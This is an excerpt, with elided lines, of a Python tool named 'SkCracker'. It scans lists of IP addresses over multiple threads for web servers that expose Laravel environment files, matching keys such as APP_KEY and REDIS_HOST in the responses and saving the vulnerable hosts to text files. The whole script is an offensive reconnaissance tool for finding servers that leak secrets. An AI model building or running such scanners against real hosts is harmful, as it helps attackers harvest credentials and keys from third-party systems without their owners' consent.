...
import time, requests, threading, random, os, platform
...
def main():
    ...
    selection = input(Colorate.Horizontal(Colors.yellow_to_green, f"root@{platform.system()}:~/SkCracker# » "))
    ...
    if selection == '1':
        ...
        file = input(Colorate.Horizontal(Colors.yellow_to_green, f"root@{platform.system()}:~/SkCracker# » "))
        ...
        thrds = int(input(Colorate.Horizontal(Colors.yellow_to_green, f"root@{platform.system()}:~/SkCracker# » ")))
        clear()
        ...
        print(Colorate.Horizontal(Colors.red_to_purple, 'No Options!'))
    ...
    while True:
        ...
        try:
            ...
            if "APP_NAME" in r.text or "APP_ENV" in r.text or "APP_KEY" in r.text or "APP_DEBUG" in r.text or "APP_URL" in r.text or "MIX_PUSHER_APP_KEY" in r.text or "REDIS_HOST" in r.text:
                print(Colorate.Horizontal(Colors.yellow_to_green, f'SkCracker » [+] {ip} LIVE IP WITH ENV'))
                open('liveipwithenv.txt', 'a').write(ip + '\n')
                open('liveip.txt', 'a').write(ip + '\n')
            elif r.status_code == 200:
                print(Colorate.Horizontal(Colors.yellow_to_green, f'SkCracker » [+] {ip} LIVE IP'))
                open('liveip.txt', 'a').write(ip + '\n')
                ...
                print(Colorate.Horizontal(Colors.red_to_purple, f"SkCracker » [-] {ip} DEAD IP"))
...
def envcheck():
    while True:
        ...
        try:
            ...
            r = requests.get(f'{ip}', timeout=5)
            if "APP_NAME" in r.text or "APP_ENV" in r.text or "APP_KEY" in r.text or "APP_DEBUG" in r.text or "APP_URL" in r.text or "MIX_PUSHER_APP_KEY" in r.text or "REDIS_HOST" in r.text:
                print(Colorate.Horizontal(Colors.yellow_to_green, f'SkCracker » [+] {ip} FOUND ENV'))
                open('envs.txt', 'a').write(ip + '\n')
            else:
                print(Colorate.Horizontal(Colors.red_to_purple, f"SkCracker » [-] {ip} ENV NOT FOUND"))
